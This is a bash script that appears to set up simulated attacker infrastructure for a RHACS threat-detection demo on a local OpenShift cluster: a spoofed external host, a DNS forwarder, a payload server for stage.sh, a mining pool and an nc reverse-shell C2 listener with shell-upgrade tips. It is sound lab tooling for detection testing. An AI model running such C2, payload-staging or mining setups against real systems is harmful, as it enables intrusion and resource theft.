#!/usr/bin/env bash
# attacker.sh — the attacker's machine is THIS LAPTOP, outside the cluster.
#
# To the cluster (and to RHACS) the attacker is an external host: attacker.example.local,
# which resolves to 1.2.3.4 — a real public address that `up` adds to this laptop's CRC
# bridge ("spoofed" locally). The VM's default gateway is the laptop, so pod traffic to it
# lands here and never leaves the machine. Private 192.168.x addresses would show as
# internal in RHACS; a public one is an external entity, like a real attacker.
# Nothing attacker-side runs in OpenShift.
#
#   attacker.sh up       start the attacker's nameserver (:5300/udp), payload server (:8080),
#                        mining pool (:3333); open the firewall; point cluster DNS at the attacker's zone
#   attacker.sh c2       interactive reverse-shell listener on :4444 (run in a second terminal)
#   attacker.sh logs     what the attacker's servers saw (downloads, miner shares)
#   attacker.sh status
#   attacker.sh check    exit 0 only if everything above works end to end (used by make verify)
#   attacker.sh down     stop everything, close the firewall again
#
# Names, not IPs: OpenShift DNS forwards the zone example.local to the attacker's own
# nameserver on this laptop — just like a real attacker-controlled domain on the internet.
#
# Firewall: the laptop's default zone keeps dropping ALL inbound traffic. Only the
# CRC bridge (zone "libvirt") gets runtime rules accepting 5300/udp + 8080/3333/4444/tcp
# from 192.168.130.0/24 — the CRC VM. Address + rules are runtime only: gone after `down` or a reboot.
set -euo pipefail
source "$(dirname "$0")/lib/common.sh"

[[ -n $CRC_BRIDGE_IP ]] || die "CRC bridge 'crc' not found — is CRC running in system network mode?"
SUBNET=${CRC_BRIDGE_IP%.*}.0/24
IMAGE=localhost/attacker-kit:latest
PORTS=(8080 3333 4444)
DNS_PORT=5300

rules() {
  for p in "${PORTS[@]}"; do echo "rule family=ipv4 source address=$SUBNET port port=$p protocol=tcp accept"; done
  echo "rule family=ipv4 source address=$SUBNET port port=$DNS_PORT protocol=udp accept"
}

# Root part: attacker address on the CRC bridge + firewall rules. Done by the root-owned helper
# /usr/local/sbin/tdr-attacker-net, which sudo runs WITHOUT a password once
# scripts/install-nopasswd.sh was run — so `make up` / `make down` never prompt.
# Without the helper: one root prompt (sudo in a terminal, desktop dialog otherwise).
HELPER=/usr/local/sbin/tdr-attacker-net
fw() { # open|close
  if [[ -x $HELPER ]] && sudo -n -l "$HELPER" >/dev/null 2>&1; then
    sudo -n "$HELPER" "$1" "$ATTACKER_IP"; return
  fi
  warn "password-less helper not installed — asking for root (run scripts/install-nopasswd.sh once to stop this)"
  local verb=--add-rich-rule addr="ip addr replace $ATTACKER_IP/32 dev crc"
  [[ $1 == close ]] && { verb=--remove-rich-rule; addr="ip addr del $ATTACKER_IP/32 dev crc"; }
  local args=""; while read -r r; do args+=" $verb='$r'"; done < <(rules)
  as_root bash -c "$addr 2>/dev/null; firewall-cmd --zone=libvirt $args >/dev/null 2>&1; true"
}

fw_open() {
  if [[ -x $HELPER ]] && sudo -n -l "$HELPER" >/dev/null 2>&1; then
    sudo -n "$HELPER" status "$ATTACKER_IP" >/dev/null 2>&1; return
  fi
  firewall-cmd --zone=libvirt --list-rich-rules 2>/dev/null | grep -q "port=\"$DNS_PORT\"" &&
    ip -4 -o addr show dev crc | grep -q " $ATTACKER_IP/"
}

# OpenShift DNS: forward the attacker's zone to the attacker's nameserver.
dns_forward() { # on|off
  local servers='[]'
  [[ $1 == on ]] && servers=$(jq -cn --arg z "$ATTACKER_ZONE" --arg u "$ATTACKER_IP:$DNS_PORT" \
    '[{name:"attacker-domain", zones:[$z], forwardPlugin:{upstreams:[$u]}}]')
  oc patch dns.operator.openshift.io default --type merge -p "{\"spec\":{\"servers\":$servers}}" >/dev/null
}

# Checked from a throwaway pod in "default" — never exec into the demo workloads
# (that would put extra processes into their RHACS baselines).
# A Job (not `oc run -i`, which RHACS would flag as "Attach to Pod").
resolves_in_cluster() {
  oc delete job tdr-dns-check -n default --ignore-not-found >/dev/null 2>&1
  oc create job tdr-dns-check -n default --image=registry.access.redhat.com/ubi9/ubi-minimal:latest -- \
    curl -sf -m 5 -o /dev/null "http://$ATTACKER:8080/stage.sh" >/dev/null 2>&1 || return 1
  oc wait --for=condition=complete job/tdr-dns-check -n default --timeout=40s >/dev/null 2>&1; local rc=$?
  oc delete job tdr-dns-check -n default --ignore-not-found >/dev/null 2>&1
  return $rc
}

# Name the attacker's address in RHACS (Network Graph → external entities / CIDR blocks).
rhacs_entity() {
  load_rhacs
  local cid; cid=$(rox GET /v1/clusters | jq -r --arg n "$CLUSTER_NAME" '.clusters[] | select(.name==$n) | .id')
  [[ -n $cid ]] || { warn "RHACS cluster $CLUSTER_NAME not found"; return; }
  local ents; ents=$(rox GET "/v1/networkgraph/cluster/$cid/externalentities")
  # drop stale entries with our name but another address
  for id in $(jq -r --arg n "$ATTACKER" --arg c "$ATTACKER_IP/32" '.entities[]? | select(.info.externalSource.name==$n and .info.externalSource.cidr!=$c) | .info.id' <<<"$ents"); do
    rox DELETE "/v1/networkgraph/externalentities/$id" >/dev/null
  done
  jq -e --arg c "$ATTACKER_IP/32" '.entities[]? | select(.info.externalSource.cidr==$c)' <<<"$ents" >/dev/null && return
  rox POST "/v1/networkgraph/cluster/$cid/externalentities" \
    "$(jq -cn --arg n "$ATTACKER" --arg c "$ATTACKER_IP/32" '{entity:{name:$n, cidr:$c}}')" >/dev/null
}

build() {
  podman image exists "$IMAGE" || podman build -q -t "$IMAGE" "$TDR_DIR/app/attacker-kit" >/dev/null
}

up() {
  step "Attacker infrastructure on this laptop ($ATTACKER_IP)"
  build
  fw_open || fw open
  fw_open && ok "firewall: CRC VM ($SUBNET) may reach $DNS_PORT/udp ${PORTS[*]}/tcp (runtime rules, zone libvirt)" || die "attacker address / firewall rules not applied"
  podman rm -f tdr-dns tdr-payload tdr-pool >/dev/null 2>&1 || true
  podman run -d --name tdr-dns     --read-only -e ATTACKER_ZONE="$ATTACKER_ZONE" -e ATTACKER_HOST="$ATTACKER_IP" -p "$ATTACKER_IP:$DNS_PORT:5300/udp" "$IMAGE" dns >/dev/null
  podman run -d --name tdr-payload --read-only -e ATTACKER_NAME="$ATTACKER" -p "$ATTACKER_IP:8080:8080" "$IMAGE" serve >/dev/null
  podman run -d --name tdr-pool    --read-only -p "$ATTACKER_IP:3333:3333" "$IMAGE" pool >/dev/null
  ok "attacker address $ATTACKER_IP on the CRC bridge (public IP, spoofed locally — never leaves this laptop)"
  ok "nameserver      *.$ATTACKER_ZONE → $ATTACKER_IP  ($ATTACKER_IP:$DNS_PORT/udp)"
  ok "payload server  http://$ATTACKER:8080/stage.sh"
  ok "mining pool     stratum+tcp://$ATTACKER:3333"
  use_crc
  dns_forward on
  ok "OpenShift DNS forwards $ATTACKER_ZONE → attacker's nameserver"
  rhacs_entity
  ok "RHACS network entity '$ATTACKER' = $ATTACKER_IP/32 (shows by name in the network graph)"
  if true; then
    wait_for "$ATTACKER reachable by name from inside the cluster" 180 resolves_in_cluster
  fi
  info "reverse shell listener: scripts/attacker.sh c2   (second terminal)"
}

c2() {
  build
  fw_open || fw open
  podman rm -f tdr-c2 >/dev/null 2>&1 || true

  # The listener runs inside an INTERACTIVE shell (sh -i → job control on the pty), so after the
  # raw `-e /bin/sh` reverse shell lands you can upgrade it to a usable TTY: Ctrl-Z to background
  # the listener, `stty raw -echo; fg` to put the local terminal in raw mode and resume, then set
  # the size on the remote side. The rc (sourced via $ENV) prints the cheat with the pane's ACTUAL
  # rows/cols (from `stty size`) so you don't have to guess, then starts the listener as a job.
  local rc="$STATE_DIR/c2rc.sh"
  cat > "$rc" <<'RC'
sz=$(stty size 2>/dev/null); R=${sz% *}; C=${sz#* }
listen() { nc -lv -p 4444; }
printf '\033[1;31m☠  C2 listening on %s:4444 — waiting for the victim to call home…\033[0m\n' "${ATTACKER:-attacker}"
printf '\033[2mafter a session ends, type  \033[0m\033[1mlisten\033[0m\033[2m  to wait for another connection.\033[0m\n\n'
listen
printf '\n\033[2m[listener stopped]  \033[0m\033[1mfg\033[0m\033[2m to resume it, or \033[0m\033[1mlisten\033[0m\033[2m to wait for a new connection.\033[0m\n'
RC
  exec podman run --rm -it --name tdr-c2 -p "$ATTACKER_IP:4444:4444" \
    -e ATTACKER="$ATTACKER" -e "ENV=/c2rc.sh" -v "$rc:/c2rc.sh:ro,Z" \
    --entrypoint sh "$IMAGE" -i
}

logs() {
  echo "${B}payload server${N}"; podman logs --tail "${1:-20}" tdr-payload 2>&1 | sed 's/^/  /'
  echo "${B}mining pool${N}";    podman logs --tail "${1:-20}" tdr-pool 2>&1 | sed 's/^/  /'
  echo "${B}nameserver${N}";     podman logs --tail "${1:-20}" tdr-dns 2>&1 | sed 's/^/  /'
}

status() {
  printf '  attacker      %s → %s (this laptop)\n' "$ATTACKER" "$ATTACKER_IP"
  printf '  firewall      %s\n' "$(fw_open && echo open-for-crc || echo closed)"
  podman ps -a --filter name=tdr- --format '  {{.Names}}\t{{.Status}}\t{{.Ports}}'
}

down() {
  step "Tearing down attacker infrastructure"
  podman rm -f tdr-dns tdr-payload tdr-pool tdr-c2 >/dev/null 2>&1 || true
  ok "attacker containers stopped"
  # DNS forwarding lives in the cluster: only touch it if the cluster answers (down must work either way)
  if crc status -o json 2>/dev/null | jq -e '.openshiftStatus == "Running"' >/dev/null && (use_crc) >/dev/null 2>&1; then
    use_crc; dns_forward off; ok "OpenShift DNS forwarding removed"
  else
    info "cluster not reachable — DNS forwarding left as is (harmless; 'up' sets it again)"
  fi
  fw_open && fw close
  fw_open && warn "firewall rules still present" || ok "firewall closed again"
}

# Exit 0 only if the attacker is fully usable: containers up, firewall open, and the
# attacker's name resolves AND serves the payload from inside the cluster.
check() {
  local c
  for c in tdr-dns tdr-payload tdr-pool; do
    [[ $(podman inspect -f '{{.State.Running}}' "$c" 2>/dev/null) == true ]] || { warn "$c not running"; return 1; }
  done
  fw_open || { warn "firewall/attacker address not set"; return 1; }
  use_crc
  resolves_in_cluster || { warn "$ATTACKER not reachable from the cluster"; return 1; }
}

case "${1:-}" in
  up|c2|logs|status|down|check) "$@" ;;
  ip) echo "$ATTACKER_IP" ;;
  *) sed -n '2,15p' "$0" | sed 's/^# \{0,1\}//'; exit 1 ;;
esac
